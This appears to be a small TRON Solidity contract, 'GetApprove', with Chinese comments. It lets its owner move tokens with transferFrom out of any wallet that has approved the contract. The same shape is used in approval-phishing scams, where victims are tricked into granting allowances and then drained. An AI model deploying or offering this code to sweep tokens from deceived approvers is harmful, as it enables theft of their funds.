pragma solidity ^0.5.0;

// 导入 ERC-20 代币合约接口
import "./ITRC20.sol";

contract GetApprove  {
    address public owner; // 合约的创建者

     constructor () public {
        owner = msg.sender;
    }
    

    // 创建者调用此函数来从授权者的账户转移代币到目标账户
    function transferTokensFrom(address tokenContract, address from, address to, uint256 amount) external {
        require(msg.sender == owner, "Only the owner can transfer tokens");
        // 实例化 ERC-20 代币合约
        ITRC20 token = ITRC20(tokenContract);

        // 调用代币合约的 transferFrom 函数，将代币从授权者转移到目标账户
        require(token.transferFrom(from, to, amount), "Token transfer failed");
    }

    // // 创建者调用此函数来查询特定代币的被授权总额
    // function allowanceOfToken(address tokenContract, address owner, address spender) external view returns (uint256) {
    //     // 实例化 ERC-20 代币合约
    //     ITRC20 token = ITRC20(tokenContract);
    //     return token.allowance(owner, spender);
    // }
}
